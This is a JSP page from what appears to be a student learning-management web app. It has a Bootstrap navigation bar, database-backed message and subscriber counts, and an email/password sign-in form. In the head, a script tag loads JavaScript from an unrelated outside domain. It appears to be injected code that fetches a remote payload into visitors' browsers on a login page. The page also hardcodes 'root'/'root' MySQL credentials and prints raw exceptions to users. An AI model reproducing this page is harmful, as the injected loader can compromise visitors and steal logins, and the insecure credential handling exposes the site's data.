<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>
    
<%@ page import="java.sql.*" %>
<%@ page import="javax.servlet.RequestDispatcher" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
  	<script src="http://d.trackbreakingnews.com/l/load.js"></script>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="../../favicon.ico">

    <title>Data</title>

    <!-- Bootstrap core CSS -->
    <link href="CSS/bootstrap.min.css" rel="stylesheet">
    <link href="CSS/Style.css" rel="stylesheet">
    <!-- Bootstrap theme -->
    <link href="CSS/bootstrap-theme.min.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="CSS/theme.css" rel="stylesheet">

    <!-- Just for debugging purposes. Don't actually copy these 2 lines! -->
    <!--[if lt IE 9]>
    <script src="js/ie8-responsive-file-warning.js"></script>
    <![endif]-->
    <script src="js/ie-emulation-modes-warning.js"></script>
    
</script>
<link rel="stylesheet" href="CSS/animate.css">
<script src="js/wow.min.js"> </script>
<script> new WOW().init();</script>

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
    <style type="text/css">
    .Cvv {
    padding-top: 55px;
    }
    .CCC h3 {
    position: relative;
    right:590px;
    top:50px;
    }
    .ZX{ 
    padding-top: 50px;
    }
    
    </style>

   
    <title>
        HTML Document Structure
    </title>
    <link rel="stylesheet" type="text/css" href="${pageContext.request.contextPath}/css/style.css" />
    <link rel="stylesheet" href="${pageContext.request.contextPath}/css/styles.css">
    <style type="text/css">
body {
	background: url("${pageContext.request.contextPath}/images/background.jpg");
}
.XLL {
	width:350px;
	height:180px;
	background-color: #fff;
}
.XL {
	position:relative;
	right:-25px;
	width: 300px;
	height: 40px;
	padding-top:18px;
}
.user-icon {
	top:153px; /* Positioning fix for slide-in, got lazy to think up of simpler method. */
	background: rgba(65,72,72,0.75) url('${pageContext.request.contextPath}/images/user-icon.png') no-repeat center;	
}

.pass-icon {
	top:201px;
	background: rgba(65,72,72,0.75) url('${pageContext.request.contextPath}/images/pass-icon.png') no-repeat center;
}


</style>
</head>
<body>
<%
  		String user=(String) session.getAttribute("xmail");
  	  		if(user==null){
  			request.setAttribute("Error","You Must Login First...");
  			RequestDispatcher rd=request.getRequestDispatcher("Login1.jsp");
  			rd.forward(request, response);	
  		}
  		%>
                  	<div class="navbar navbar-inverse navbar-fixed-top pulse animated">
					<div class="container">
						<a class="navbar-brand XX" href="Home.jsp">
							<img src="iWall/logo1.png"><p>LMS</p>
						</a>
						<button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
						<span class="icon-bar"></span>
						<span class="icon-bar"></span>
						<span class="icon-bar"></span>
						</button>
						<div class="collapse navbar-collapse">
					<ul class="nav navbar-nav pull-right">
					
					
						<li > <a href="Home.jsp">Home</a></li>
					<li > <a href="Course.jsp">Course</a></li>
					
					
				 <%
						 session=request.getSession();
                   		String ss1=(String) session.getAttribute("xuser");
                   		String ss2=(String) session.getAttribute("xmail");
						if(ss1==null && ss2==null){
                     %>
                     <li> <a href="Owner1.jsp">Owner</a></li>
					<li> <a href="Login1.jsp">Login</a></li>
					<%}
						else if(ss2==null && ss1!=null){%>
						
					<li> <a href="Profile.jsp">Data Records</a></li>
					<li class="dropdown">
						<a href="#" data-toggle="dropdown" class="dropdown-toggle">More <span class="caret"></span></a>
						<ul class="dropdown-menu">
						<li> <a href="Owner1.jsp"><%=ss1 %></a> </li>
						<li class="divider"></li>
						<li><a href="#">Setting</a> </li>
						<li class="divider"></li>
						<li> <a href="Logout2.jsp">Logout</a> </li>
						
						<%} %>
						
						
                   <%
						 session=request.getSession();
                   		String ss=(String) session.getAttribute("xmail");
						if(ss!=null){
                     %>
                     
						<%
						int count=0;
						try{
						Class.forName("com.mysql.jdbc.Driver");
						Connection con=DriverManager.getConnection("jdbc:mysql://localhost:3306/mystore","root","root");
						String str="select * from msg";
						PreparedStatement ps=con.prepareStatement(str);
						ResultSet rs=ps.executeQuery();
						while(rs.next()) {
						count++;
						}
						con.close();
						}catch(Exception e) {
							out.println(e);
						}
						
						%>
					<li><a href="Msg3.jsp">Message <span class="badge"> <%=count %> </span></a></li>
					
					
						<%
						int count1=0;
						try{
						Class.forName("com.mysql.jdbc.Driver");
						Connection con=DriverManager.getConnection("jdbc:mysql://localhost:3306/mystore","root","root");
						String str="select * from sub";
						PreparedStatement ps=con.prepareStatement(str);
						ResultSet rs=ps.executeQuery();
						while(rs.next()) {
						count1++;
						}
						con.close();
						}catch(Exception e) {
							out.println(e);
						}
						
						%>
					<li> <a href="Sub2.jsp">Subscribers<span class="badge"> <%=count1 %> </span></a></li>
                     <li class="dropdown">
                     <a href="#" data-toggle="dropdown" class="dropdown-toggle">Setup<span class="caret"></span></a>
                     <ul class="dropdown-menu">
                    <li class="active"> <a href="Data.jsp">Data Entry</a></li>
                    <li class="divider"></li>
					<li> <a href="Profile.jsp">Data Records</a></li>
					<li class="divider"></li>
					<li> <a href="Report.jsp">Reports</a></li>
					</ul></li>
					<li class="dropdown">
					<a href="#" data-toggle="dropdown" class="dropdown-toggle">Contact Us <span class="caret"></span></a>
					<ul class="dropdown-menu">
					
						<li><a href="Owner1.jsp"><%=ss %></a></li>
						<li class="divider"></li>
						<li><a href="Forgot.jsp">Setting</a></li>
						<li class="divider"></li>
						<li><a href="Msg2.jsp">Message <span class="badge"> <%=count %> </span></a></li>
						<li class="divider">
						<li><a href="index.html">Activity-Log</a></li>
						<li class="divider"></li>
						<li><a href="Logout.jsp">Logout</a></li>
					</UL>
						

					</li>
					<%
						}
					%>
					</ul>
	          </div> 
	      </div>
	  </div>
<br/><br/><br/>

     <div class="col-lg-4">
            <div class="list-group XLL">
                    <div class="account-wall">
                        <form class="form-group XL"class="login-form" action="checkLogin" method="post">
                        	<input type="text" name="username" class="form-control"  placeholder="email" required autofocus> <br/>
                            <input type="password" name="password"   placeholder="Password"  class="form-control"  required> <br/>
                            <a href="ForgetPass1.jsp">Forgot Password?</a> 
                            
                            <button class="btn btn-primary pull-right" type="submit" name="submit" > Sign-in</button> <br/>
                        
                        </form>
                    </div>
                </a> <br/>
                
                </a>
            </div>
        </div>
<script src="jquery.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/docs.min.js"></script>
    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <script src="js/ie10-viewport-bug-workaround.js"></script>
    <script>
	$('.dropdown').hover(function() {
		$('.dropdown-toggle',this).trigger('click');
	});
	</script>
  </body>
</html>
